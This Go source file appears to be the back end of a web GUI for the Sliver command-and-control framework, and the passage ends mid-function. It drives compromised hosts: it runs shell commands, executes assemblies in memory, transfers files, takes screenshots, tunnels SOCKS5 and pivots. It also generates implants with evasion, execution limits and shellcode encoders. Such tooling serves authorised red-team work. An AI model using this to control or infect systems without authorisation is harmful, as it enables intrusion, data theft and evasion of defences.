package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/bishopfox/sliver/client/assets"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"

	"google.golang.org/grpc"
	"google.golang.org/protobuf/proto"
)

// callTimeout is the default deadline applied to Sliver RPCs and embedded in
// the commonpb.Request timeout field (which the server expects in nanoseconds).
const callTimeout = 60 * time.Second

// Sliver wraps an authenticated gRPC connection to a Sliver server and exposes
// the subset of operations the web GUI needs.
type Sliver struct {
	cfg  *assets.ClientConfig
	rpc  rpcpb.SliverRPCClient
	conn *grpc.ClientConn

	mu      sync.RWMutex
	targets map[string]targetInfo // id -> kind/os, cached from list calls
}

type targetKind int

const (
	kindSession targetKind = iota
	kindBeacon
)

type targetInfo struct {
	kind targetKind
	os   string
	c2   string // beacon's active C2 URL, needed to open an interactive session
}

// beaconWait bounds how long a synchronous handler will wait for a beacon to
// check in and return a tasked result before giving up. A beacon only reports
// on its own sleep schedule, so browsing files/processes on a slow beacon is
// inherently slow; this caps the wait so a request can't hang forever.
const beaconWait = 120 * time.Second

// Connect loads the operator config and establishes the mTLS gRPC connection.
func Connect(configPath string) (*Sliver, error) {
	cfg, err := assets.ReadConfig(configPath)
	if err != nil {
		return nil, fmt.Errorf("read config %q: %w", configPath, err)
	}
	rpc, conn, err := transport.MTLSConnect(cfg)
	if err != nil {
		return nil, fmt.Errorf("connect %s:%d: %w", cfg.LHost, cfg.LPort, err)
	}
	return &Sliver{cfg: cfg, rpc: rpc, conn: conn, targets: map[string]targetInfo{}}, nil
}

func (s *Sliver) Close() error { return s.conn.Close() }

func ctxTimeout() (context.Context, context.CancelFunc) {
	return context.WithTimeout(context.Background(), callTimeout+10*time.Second)
}

// request builds the commonpb.Request for a given target, choosing sync
// (session) vs async (beacon) semantics based on the cached target kind.
func (s *Sliver) request(id string) *commonpb.Request {
	req := &commonpb.Request{Timeout: int64(callTimeout)}
	s.mu.RLock()
	kind := s.targets[id].kind
	s.mu.RUnlock()
	if kind == kindBeacon {
		req.Async = true
		req.BeaconID = id
	} else {
		req.Async = false
		req.SessionID = id
	}
	return req
}

func (s *Sliver) targetOS(id string) string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.targets[id].os
}

// taskedResponse is the shape shared by every sliverpb command response: it
// carries the commonpb.Response that says whether the call was tasked to a
// beacon (Async) and, if so, the TaskID to fetch the eventual result from.
type taskedResponse interface {
	proto.Message
	GetResponse() *commonpb.Response
}

// resolve turns an async (beacon) response into a completed one. For a session
// the response is already populated and this is a no-op. For a beacon the RPC
// only queued the task, so we poll until the beacon checks in and unmarshal the
// real result back into resp. This lets the file/process/network views work on
// beacons with the same handlers used for sessions.
func (s *Sliver) resolve(resp taskedResponse) error {
	r := resp.GetResponse()
	if r == nil || !r.Async || r.TaskID == "" {
		return nil
	}
	deadline := time.Now().Add(beaconWait)
	for {
		task, err := s.BeaconTaskContent(r.TaskID)
		if err != nil {
			return err
		}
		if task.State == "completed" {
			if len(task.Response) > 0 {
				return proto.Unmarshal(task.Response, resp)
			}
			return nil
		}
		if time.Now().After(deadline) {
			return fmt.Errorf("beacon has not checked in yet (task %s); try again in a few seconds", task.State)
		}
		time.Sleep(time.Second)
	}
}

func (s *Sliver) rememberTargets(sessions []*clientpb.Session, beacons []*clientpb.Beacon) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, sess := range sessions {
		s.targets[sess.ID] = targetInfo{kind: kindSession, os: sess.OS}
	}
	for _, b := range beacons {
		s.targets[b.ID] = targetInfo{kind: kindBeacon, os: b.OS, c2: b.ActiveC2}
	}
}

// ---- Read/list operations ----

func (s *Sliver) Sessions() ([]*clientpb.Session, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.GetSessions(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	s.rememberTargets(resp.Sessions, nil)
	return resp.Sessions, nil
}

func (s *Sliver) Beacons() ([]*clientpb.Beacon, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.GetBeacons(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	s.rememberTargets(nil, resp.Beacons)
	return resp.Beacons, nil
}

func (s *Sliver) Jobs() ([]*clientpb.Job, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.GetJobs(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	return resp.Active, nil
}

// ---- Job/listener management ----

func (s *Sliver) StartMTLS(host string, port uint32) (*clientpb.ListenerJob, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	return s.rpc.StartMTLSListener(ctx, &clientpb.MTLSListenerReq{Host: host, Port: port})
}

func (s *Sliver) StartHTTP(host, domain string, port uint32, secure bool) (*clientpb.ListenerJob, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	req := &clientpb.HTTPListenerReq{Host: host, Domain: domain, Port: port, Secure: secure}
	if secure {
		return s.rpc.StartHTTPSListener(ctx, req)
	}
	return s.rpc.StartHTTPListener(ctx, req)
}

func (s *Sliver) KillJob(id uint32) error {
	ctx, cancel := ctxTimeout()
	defer cancel()
	_, err := s.rpc.KillJob(ctx, &clientpb.KillJobReq{ID: id})
	return err
}

// ---- Pivots ----
// Pivot listeners run *on an implant* (a session), letting downstream hosts that
// can't reach the server route through it. They are server/implant-managed, so
// unlike client-tunnelled socks5/portfwd they persist after any one console
// exits. Only sessions can host pivot listeners.

// sessionRequest builds a synchronous, session-scoped request. Pivot RPCs are
// only meaningful against a live session (never a beacon).
func (s *Sliver) sessionRequest(sessionID string) *commonpb.Request {
	return &commonpb.Request{Timeout: int64(callTimeout), Async: false, SessionID: sessionID}
}

// Note on implant-side errors: pivot RPCs are always synchronous (see
// sessionRequest), and for sync requests the server's GenericHandler already
// converts a non-empty Response.Err into a FailedPrecondition gRPC error before
// it reaches us. So checking `err` here is sufficient — the implant's real
// reason ("bind: Only one usage of each socket address...") arrives in it. The
// CLI's extra Response.Err check is belt-and-braces for the same path.

// PivotGraph returns the server-wide tree of pivoted sessions.
func (s *Sliver) PivotGraph() (*clientpb.PivotGraph, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	return s.rpc.PivotGraph(ctx, &commonpb.Empty{})
}

// PivotListeners lists the pivot listeners currently running on a session.
func (s *Sliver) PivotListeners(sessionID string) ([]*sliverpb.PivotListener, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.PivotSessionListeners(ctx, &sliverpb.PivotListenersReq{Request: s.sessionRequest(sessionID)})
	if err != nil {
		return nil, err
	}
	return resp.Listeners, nil
}

// StartPivot starts a tcp or named-pipe pivot listener on a session. bind is the
// listener's bind address: an ip[:port] for tcp, or a pipe name for named-pipe.
// allowAll applies to named pipes only: it opens the pipe's DACL to everyone,
// which downstream implants running as a different user or machine account need
// in order to connect (the CLI spells this --allow-all).
func (s *Sliver) StartPivot(sessionID, pivotType, bind string, allowAll bool) (*sliverpb.PivotListener, error) {
	var t sliverpb.PivotType
	var opts []bool
	switch strings.ToLower(pivotType) {
	case "tcp", "":
		t = sliverpb.PivotType_TCP
		// The implant hands BindAddress straight to net.Listen, where an empty
		// string means "all interfaces, kernel-chosen port". That silently
		// yields a listener on a random port no generated payload can reach, so
		// always send an explicit host:port the way the CLI does.
		if bind == "" {
			bind = ":9898"
		} else if !strings.Contains(bind, ":") {
			bind += ":9898"
		}
	case "named-pipe", "namedpipe", "pipe":
		t = sliverpb.PivotType_NamedPipe
		opts = []bool{allowAll}
	default:
		return nil, fmt.Errorf("unknown pivot type %q (want tcp or named-pipe)", pivotType)
	}
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.PivotStartListener(ctx, &sliverpb.PivotStartListenerReq{
		Type:        t,
		BindAddress: bind,
		Options:     opts,
		Request:     s.sessionRequest(sessionID),
	})
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// StopPivot stops a pivot listener (by its listener ID) on a session.
func (s *Sliver) StopPivot(sessionID string, id uint32) error {
	ctx, cancel := ctxTimeout()
	defer cancel()
	_, err := s.rpc.PivotStopListener(ctx, &sliverpb.PivotStopListenerReq{ID: id, Request: s.sessionRequest(sessionID)})
	return err
}

// ---- SOCKS5 ----
// A socks5 proxy is *client*-tunnelled: the listening socket lives in whichever
// client started it and every connection is relayed over that client's gRPC
// stream. The native console can't host one, because its one-shot
// `sliver-client` exits the moment the command returns and takes the listener
// with it (see console.go). So the bridge runs the proxy itself, on its own
// long-lived connection — which also means the proxy survives browser reloads
// and lives as long as the sliver-web-gui service.

// sessionByID fetches the full clientpb.Session that core.TcpProxy needs.
func (s *Sliver) sessionByID(sessionID string) (*clientpb.Session, error) {
	sessions, err := s.Sessions()
	if err != nil {
		return nil, err
	}
	for _, sess := range sessions {
		if sess.ID == sessionID {
			return sess, nil
		}
	}
	return nil, fmt.Errorf("no live session %s (socks5 needs a session, not a beacon)", sessionID)
}

// StartSocks opens a socks5 listener on the bridge host and tunnels it through
// the given session. host/port default to 127.0.0.1:1080. A non-empty username
// enables proxy auth with a generated password, which is returned to the caller.
func (s *Sliver) StartSocks(sessionID, host, port, username string) (*core.SocksProxyMeta, error) {
	sess, err := s.sessionByID(sessionID)
	if err != nil {
		return nil, err
	}
	if host == "" {
		host = "127.0.0.1"
	}
	if port == "" {
		port = "1080"
	}
	bindAddr := net.JoinHostPort(host, port)
	ln, err := net.Listen("tcp", bindAddr)
	if err != nil {
		return nil, fmt.Errorf("socks5 listen %s: %w", bindAddr, err)
	}
	password := ""
	if username != "" {
		// Credentials are tunnelled to the implant and recoverable from its
		// memory — the CLI warns about this; the GUI shows the same warning.
		buf := make([]byte, 16)
		if _, err := rand.Read(buf); err != nil {
			ln.Close()
			return nil, err
		}
		password = base64.RawStdEncoding.EncodeToString(buf)
	}
	proxy := core.SocksProxies.Add(&core.TcpProxy{
		Rpc:             s.rpc,
		Session:         sess,
		Listener:        ln,
		BindAddr:        bindAddr,
		Username:        username,
		Password:        password,
		KeepAlivePeriod: 60 * time.Second,
		DialTimeout:     30 * time.Second,
	})
	go core.SocksProxies.Start(proxy.ChannelProxy)
	return proxy.GetMetadata(), nil
}

// SocksList returns every socks5 proxy this bridge is currently hosting.
func (s *Sliver) SocksList() []*core.SocksProxyMeta {
	list := core.SocksProxies.List()
	sort.Slice(list, func(i, j int) bool { return list[i].ID < list[j].ID })
	return list
}

// StopSocks closes a socks5 proxy's listener and all of its connections.
func (s *Sliver) StopSocks(id uint64) error {
	if !core.SocksProxies.Remove(id) {
		return fmt.Errorf("no socks5 proxy with id %d", id)
	}
	return nil
}

// ---- Target (session) interaction ----

func (s *Sliver) Execute(id, path string, args []string) (*sliverpb.Execute, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	return s.rpc.Execute(ctx, &sliverpb.ExecuteReq{
		Path:    path,
		Args:    args,
		Output:  true,
		Request: s.request(id),
	})
}

// ExecuteShell runs a full command line through the target's native shell so a
// terminal behaves normally: shell builtins (dir/cd/type on Windows, cd/export
// on *nix), quoting, redirection and pipelines all work. Bare Execute only runs
// a single binary with argv, which silently no-ops on builtins.
func (s *Sliver) ExecuteShell(id, cmdline string) (*sliverpb.Execute, error) {
	path, args := shellFor(s.targetOS(id), cmdline)
	return s.Execute(id, path, args)
}

func shellFor(os, cmdline string) (path string, args []string) {
	if strings.Contains(strings.ToLower(os), "win") {
		return "cmd.exe", []string{"/C", cmdline}
	}
	return "/bin/sh", []string{"-c", cmdline}
}

// ExecuteAssembly runs a .NET assembly (given as raw bytes read from the bridge
// host) in memory on the target, mirroring sliver-client's execute-assembly
// defaults (fork/exec into notepad.exe, x86+x64 loader). The result is resolved
// for beacons, so callers get the assembly's output the same way for both kinds.
func (s *Sliver) ExecuteAssembly(id string, assembly []byte, args []string, process string) (*sliverpb.ExecuteAssembly, error) {
	if process == "" {
		process = "notepad.exe"
	}
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.ExecuteAssembly(ctx, &sliverpb.ExecuteAssemblyReq{
		Assembly:  assembly,
		Arguments: args,
		Process:   process,
		Arch:      "x84", // x86+x64 — let the loader pick, matching the CLI default
		Request:   s.request(id),
	})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

// Interactive tasks a beacon to open an interactive session using its own
// active C2 endpoint (the sliver-client `interactive` command). The session is
// established on the beacon's next check-in and shows up via the event stream,
// so this only queues the request — it is not resolved.
func (s *Sliver) Interactive(id string) (*sliverpb.OpenSession, error) {
	s.mu.RLock()
	info := s.targets[id]
	s.mu.RUnlock()
	if info.kind != kindBeacon {
		return nil, fmt.Errorf("interactive applies to beacons; a session is already interactive")
	}
	if info.c2 == "" {
		return nil, fmt.Errorf("no active C2 endpoint known for this beacon yet; refresh agents and retry")
	}
	ctx, cancel := ctxTimeout()
	defer cancel()
	return s.rpc.OpenSession(ctx, &sliverpb.OpenSession{
		C2S:     []string{info.c2},
		Request: s.request(id),
	})
}

// BeaconTaskContent fetches a single beacon task by ID. For a still-pending
// task the State is "pending"/"sent" and Response is empty; once the beacon has
// checked in and returned the result, State is "completed" and Response holds
// the command's serialized protobuf (e.g. a marshaled sliverpb.Execute).
func (s *Sliver) BeaconTaskContent(taskID string) (*clientpb.BeaconTask, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	return s.rpc.GetBeaconTaskContent(ctx, &clientpb.BeaconTask{ID: taskID})
}

func (s *Sliver) Ls(id, path string) (*sliverpb.Ls, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	if path == "" {
		path = "."
	}
	resp, err := s.rpc.Ls(ctx, &sliverpb.LsReq{Path: path, Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Pwd(id string) (*sliverpb.Pwd, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Pwd(ctx, &sliverpb.PwdReq{Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Cd(id, path string) (*sliverpb.Pwd, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Cd(ctx, &sliverpb.CdReq{Path: path, Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Ps(id string) (*sliverpb.Ps, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Ps(ctx, &sliverpb.PsReq{Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Netstat(id string) (*sliverpb.Netstat, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Netstat(ctx, &sliverpb.NetstatReq{
		TCP: true, UDP: true, Listening: true, IP4: true, IP6: true,
		Request: s.request(id),
	})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Ifconfig(id string) (*sliverpb.Ifconfig, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Ifconfig(ctx, &sliverpb.IfconfigReq{Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Download(id, path string) (*sliverpb.Download, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Download(ctx, &sliverpb.DownloadReq{Path: path, Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	if err := s.resolve(resp); err != nil {
		return nil, err
	}
	// Sliver gzip-compresses download payloads; decompress transparently.
	if resp.Encoder == "gzip" {
		if raw, derr := gunzip(resp.Data); derr == nil {
			resp.Data = raw
			resp.Encoder = ""
		}
	}
	return resp, nil
}

func gunzip(data []byte) ([]byte, error) {
	zr, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer zr.Close()
	return io.ReadAll(zr)
}

func (s *Sliver) Upload(id, path string, data []byte) (*sliverpb.Upload, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Upload(ctx, &sliverpb.UploadReq{
		Path:    path,
		Data:    data,
		Request: s.request(id),
	})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Rm(id, path string, recursive bool) (*sliverpb.Rm, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Rm(ctx, &sliverpb.RmReq{Path: path, Recursive: recursive, Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Mkdir(id, path string) (*sliverpb.Mkdir, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Mkdir(ctx, &sliverpb.MkdirReq{Path: path, Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

func (s *Sliver) Screenshot(id string) (*sliverpb.Screenshot, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.Screenshot(ctx, &sliverpb.ScreenshotReq{Request: s.request(id)})
	if err != nil {
		return nil, err
	}
	return resp, s.resolve(resp)
}

// Kill terminates the implant. For a session the server removes the record as
// soon as the kill is sent. For a beacon the kill is only *queued* for the next
// check-in and Sliver deliberately leaves the beacon's DB record in place, so it
// lingers in the console. To make "kill" behave the way an operator expects, we
// queue the kill and then, in the background, wait until the beacon has actually
// collected the kill task (the task leaves the "pending" state — proof the
// implant received it) before deleting the record with RmBeacon. A beacon that
// never checks in to collect it is left untouched rather than silently forgotten
// while possibly still alive.
func (s *Sliver) Kill(id string) error {
	s.mu.RLock()
	kind := s.targets[id].kind
	s.mu.RUnlock()

	// Record the kill tasks that already exist so the watcher can pick out the
	// new one we're about to create rather than react to a stale one.
	var priorKillTasks map[string]bool
	if kind == kindBeacon {
		priorKillTasks = s.killTaskIDs(id)
	}

	ctx, cancel := ctxTimeout()
	defer cancel()
	if _, err := s.rpc.Kill(ctx, &sliverpb.KillReq{Force: true, Request: s.request(id)}); err != nil {
		return err
	}

	if kind == kindBeacon {
		go s.autoRemoveBeacon(id, priorKillTasks)
	}
	return nil
}

// Rename sets a session/beacon's display name on the Sliver server. The server
// enforces the allowed character set (alphanumeric plus .-_, max 32 chars).
func (s *Sliver) Rename(id, name string) error {
	s.mu.RLock()
	kind := s.targets[id].kind
	s.mu.RUnlock()
	req := &clientpb.RenameReq{Name: name}
	if kind == kindBeacon {
		req.BeaconID = id
	} else {
		req.SessionID = id
	}
	ctx, cancel := ctxTimeout()
	defer cancel()
	_, err := s.rpc.Rename(ctx, req)
	return err
}

// RemoveBeacon deletes a beacon's record (and its tasks) from the server without
// touching the implant — for clearing stale/dead beacons that will never check
// in again. Only valid for beacons; the server rejects an unknown ID.
func (s *Sliver) RemoveBeacon(id string) error {
	ctx, cancel := ctxTimeout()
	defer cancel()
	_, err := s.rpc.RmBeacon(ctx, &clientpb.Beacon{ID: id})
	return err
}

// isKillTask reports whether a beacon task is a kill request. Matched loosely on
// the description so it survives naming differences across Sliver versions
// (e.g. "KillReq" vs "Kill").
func isKillTask(t *clientpb.BeaconTask) bool {
	return strings.Contains(strings.ToLower(t.GetDescription()), "kill")
}

// killTaskIDs returns the set of existing kill-task IDs for a beacon.
func (s *Sliver) killTaskIDs(id string) map[string]bool {
	set := map[string]bool{}
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.GetBeaconTasks(ctx, &clientpb.Beacon{ID: id})
	if err != nil {
		return set
	}
	for _, t := range resp.GetTasks() {
		if isKillTask(t) {
			set[t.GetID()] = true
		}
	}
	return set
}

// autoRemoveBeacon waits until the beacon has collected the queued kill task
// (our new kill task leaves the "pending" state) and then deletes the beacon
// record. Tracking the task state — rather than a check-in timestamp — makes
// this robust regardless of the beacon's sleep interval. It gives up after
// killWatchCap so a beacon that never collects the kill is left in place instead
// of being removed while it might still be alive.
func (s *Sliver) autoRemoveBeacon(id string, priorKillTasks map[string]bool) {
	const (
		pollEvery    = 3 * time.Second
		killWatchCap = 30 * time.Minute
	)
	deadline := time.Now().Add(killWatchCap)
	for time.Now().Before(deadline) {
		time.Sleep(pollEvery)
		ctx, cancel := ctxTimeout()
		resp, err := s.rpc.GetBeaconTasks(ctx, &clientpb.Beacon{ID: id})
		cancel()
		if err != nil {
			// Record already gone (removed elsewhere) — nothing left to do.
			return
		}
		delivered := false
		for _, t := range resp.GetTasks() {
			// The new kill task, once collected by the beacon, goes pending -> sent
			// (and never returns "completed" because the implant exits).
			if isKillTask(t) && !priorKillTasks[t.GetID()] && t.GetState() != "pending" {
				delivered = true
				break
			}
		}
		if delivered {
			ctx, cancel := ctxTimeout()
			_, rmErr := s.rpc.RmBeacon(ctx, &clientpb.Beacon{ID: id})
			cancel()
			if rmErr != nil {
				log.Printf("kill: remove beacon %s after delivery (ignored): %v", id, rmErr)
			}
			return
		}
	}
	log.Printf("kill: beacon %s did not collect the kill within %s; leaving record intact", id, killWatchCap)
}

// Reconfigure updates a live beacon's sleep interval and jitter (both given in
// seconds; Sliver expects nanosecond durations). Changes take effect on the
// beacon's next check-in. Zero values are left unchanged server-side.
func (s *Sliver) Reconfigure(id string, intervalSec, jitterSec int64) (*sliverpb.Reconfigure, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	return s.rpc.Reconfigure(ctx, &sliverpb.ReconfigureReq{
		BeaconInterval: int64(time.Second) * intervalSec,
		BeaconJitter:   int64(time.Second) * jitterSec,
		Request:        s.request(id),
	})
}

// ---- Implant generation ----

type GenerateOptions struct {
	OS        string
	Arch      string
	Format    string // exe|shared|shellcode|service
	IsBeacon  bool
	Interval  int64 // beacon sleep interval, seconds
	Jitter    int64 // beacon jitter, seconds
	Reconnect int64 // reconnect interval, seconds (0 -> default 60)
	MaxErrors int64 // max connection errors before giving up (0 -> default 1000)
	Poll      int64 // poll timeout, seconds (0 -> default 360)
	C2Type    string // mtls|http|https
	C2Host    string
	C2Port    uint32
	Name      string
	SaveDir   string // if set, also write the artifact to this dir on the bridge host

	// Build options, mirroring the flags `generate` / `profiles new` bind in
	// client/command/generate/commands.go. Every one is zero-valued by default,
	// so a caller that omits them (the Generate modal) builds exactly as it did
	// before these existed.
	Debug            bool // --debug
	Evasion          bool // --evasion
	ObfuscateSymbols bool // inverse of --skip-symbols
	RunAtLoad        bool // --run-at-load (shared library only)
	NetGo            bool // --netgo

	// Execution limits — the implant exits immediately unless the host matches.
	LimitDomainJoined bool   // --limit-domainjoined
	LimitHostname     string // --limit-hostname
	LimitUsername     string // --limit-username
	LimitDatetime     string // --limit-datetime
	LimitFileExists   string // --limit-fileexists
	LimitLocale       string // --limit-locale

	// Shellcode tuning. Only meaningful when Format == "shellcode"; everything
	// except ShellcodeCompress is Windows/Donut-only. See the Stagers doc:
	// https://sliver.sh/docs?name=Stagers
	ShellcodeEncoder  string // "" / "none" / an encoder name from /api/shellcode-encoders
	ShellcodeCompress bool   // aPLib compression (windows, darwin, linux)
	ShellcodeEntropy  uint32 // 1=none 2=random names 3=random+encrypt
	ShellcodeExitOpt  uint32 // 1=exit thread 2=exit process 3=block
	ShellcodeBypass   uint32 // 1=none 2=abort on failure 3=continue
	ShellcodeHeaders  uint32 // 1=overwrite 2=keep
	ShellcodeThread   bool   // run unmanaged EXE entrypoint as a new thread
	ShellcodeUnicode  bool   // Unicode command line for unmanaged DLL entrypoints
	ShellcodeOEP      uint32 // override original entry point (0 = default)
}

// DeleteBuild removes a saved implant build by name (its DB record and the
// server-side build directory). Sliver enforces unique build names and does not
// clean up before rebuilding, so regenerating with an existing name otherwise
// fails ("rename import dir: target exists"). Deleting a name that has no build
// is a no-op as far as the caller is concerned.
func (s *Sliver) DeleteBuild(name string) error {
	if name == "" {
		return nil
	}
	ctx, cancel := ctxTimeout()
	defer cancel()
	_, err := s.rpc.DeleteImplantBuild(ctx, &clientpb.DeleteReq{Name: name})
	return err
}

// buildImplantConfig translates the web GUI's flat GenerateOptions into the
// ImplantConfig Sliver's generator expects. Shared by one-shot Generate() and
// SaveProfile() so both build implants the same way.
//
// encoder is resolved by the caller via Sliver.resolveShellcodeEncoder, which
// needs an RPC round-trip this pure function deliberately avoids.
func buildImplantConfig(opts GenerateOptions, encoder clientpb.ShellcodeEncoder) *clientpb.ImplantConfig {
	reconnect := opts.Reconnect
	if reconnect <= 0 {
		reconnect = 60
	}
	maxErrors := opts.MaxErrors
	if maxErrors <= 0 {
		maxErrors = 1000
	}
	poll := opts.Poll
	if poll <= 0 {
		poll = 360
	}
	cfg := &clientpb.ImplantConfig{
		GOOS:                opts.OS,
		GOARCH:              opts.Arch,
		IsBeacon:            opts.IsBeacon,
		BeaconInterval:      int64(time.Second) * opts.Interval,
		BeaconJitter:        int64(time.Second) * opts.Jitter,
		ReconnectInterval:   int64(time.Second) * reconnect,
		MaxConnectionErrors: uint32(maxErrors),
		PollTimeout:         int64(time.Second) * poll,
		Format:              outputFormat(opts.Format),
		Exports:             defaultExports,
		TemplateName:        "sliver",  // server looks up the build template by name
		HTTPC2ConfigName:    "default", // default HTTP C2 profile
		ConnectionStrategy:  "s",       // sequential C2 attempts

		Debug:            opts.Debug,
		Evasion:          opts.Evasion,
		ObfuscateSymbols: opts.ObfuscateSymbols,
		RunAtLoad:        opts.RunAtLoad,
		NetGoEnabled:     opts.NetGo,

		LimitDomainJoined: opts.LimitDomainJoined,
		LimitHostname:     opts.LimitHostname,
		LimitUsername:     opts.LimitUsername,
		LimitDatetime:     opts.LimitDatetime,
		LimitFileExists:   opts.LimitFileExists,
		LimitLocale:       opts.LimitLocale,

		ShellcodeEncoder: encoder,
		// Legacy mirror of the encoder choice; the server still consults it when
		// ShellcodeEncoder is NONE (see client/command/generate/generate.go).
		SGNEnabled: encoder == clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
	}
	var c2 []*clientpb.ImplantC2
	switch opts.C2Type {
	case "named-pipe":
		// Named-pipe C2 has no host/port; the operator enters a pipe path (e.g.
		// \\.\pipe\Name) in the C2Host field, dialed by a downstream pivot child
		// connecting to a session already hosting a named-pipe pivot listener.
		if opts.C2Host != "" {
			cfg.IncludeNamePipe = true
			c2 = append(c2, &clientpb.ImplantC2{URL: namedPipeURL(opts.C2Host)})
		}
	case "mtls":
		if opts.C2Host != "" && opts.C2Port > 0 {
			cfg.IncludeMTLS = true
			c2 = append(c2, &clientpb.ImplantC2{URL: fmt.Sprintf("mtls://%s:%d", opts.C2Host, opts.C2Port)})
		}
	case "https":
		if opts.C2Host != "" && opts.C2Port > 0 {
			cfg.IncludeHTTP = true
			c2 = append(c2, &clientpb.ImplantC2{URL: fmt.Sprintf("https://%s:%d", opts.C2Host, opts.C2Port)})
		}
	default: // "http"
		if opts.C2Host != "" && opts.C2Port > 0 {
			cfg.IncludeHTTP = true
			c2 = append(c2, &clientpb.ImplantC2{URL: fmt.Sprintf("http://%s:%d", opts.C2Host, opts.C2Port)})
		}
	}
	cfg.C2 = c2
	switch cfg.Format {
	case clientpb.OutputFormat_SHARED_LIB:
		cfg.IsSharedLib = true
	case clientpb.OutputFormat_SHELLCODE:
		cfg.IsShellcode = true
	case clientpb.OutputFormat_SERVICE:
		cfg.IsService = true
	}
	cfg.ShellcodeConfig = buildShellcodeConfig(opts, cfg.Format)
	return cfg
}

// buildShellcodeConfig mirrors parseShellcodeFlags in
// client/command/generate/generate.go: the shellcode knobs apply only to
// `--format shellcode`, and outside Windows only compression is honoured, so
// sending the Donut-specific fields anywhere else would be noise at best.
// Returns nil when the format/OS combination has nothing to configure.
func buildShellcodeConfig(opts GenerateOptions, format clientpb.OutputFormat) *clientpb.ShellcodeConfig {
	if format != clientpb.OutputFormat_SHELLCODE {
		return nil
	}
	// Compress is a tri-state on the wire, not a bool: 1 = none, 2 = aPLib.
	compress := uint32(1)
	if opts.ShellcodeCompress {
		compress = 2
	}
	if opts.OS != "windows" {
		// darwin (beignet) and linux (malasada) only implement compression.
		if opts.OS != "darwin" && opts.OS != "linux" {
			return nil
		}
		return &clientpb.ShellcodeConfig{Compress: compress}
	}
	// Donut rejects out-of-range values, so fall back to its own defaults
	// rather than forwarding a zero from a client that omitted the field.
	entropy := clampU32(opts.ShellcodeEntropy, 1, 3, 1)
	exitOpt := clampU32(opts.ShellcodeExitOpt, 1, 3, 1)
	bypass := clampU32(opts.ShellcodeBypass, 1, 3, 3)
	headers := clampU32(opts.ShellcodeHeaders, 1, 2, 1)
	return &clientpb.ShellcodeConfig{
		Entropy:  entropy,
		Compress: compress,
		ExitOpt:  exitOpt,
		Bypass:   bypass,
		Headers:  headers,
		Thread:   opts.ShellcodeThread,
		Unicode:  opts.ShellcodeUnicode,
		OEP:      opts.ShellcodeOEP,
	}
}

// clampU32 returns v when it falls within [lo, hi], and def otherwise.
func clampU32(v, lo, hi, def uint32) uint32 {
	if v < lo || v > hi {
		return def
	}
	return v
}

// ShellcodeEncoders reports the encoders the server can apply, keyed by the
// architecture they are compatible with ("amd64" -> ["shikata_ga_nai", ...]).
// Compatibility is per-arch, so the UI has to ask rather than hardcode a list.
func (s *Sliver) ShellcodeEncoders() (map[string][]string, error) {
	ctx, cancel := ctxTimeout()
	defer cancel()
	resp, err := s.rpc.ShellcodeEncoderMap(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := map[string][]string{}
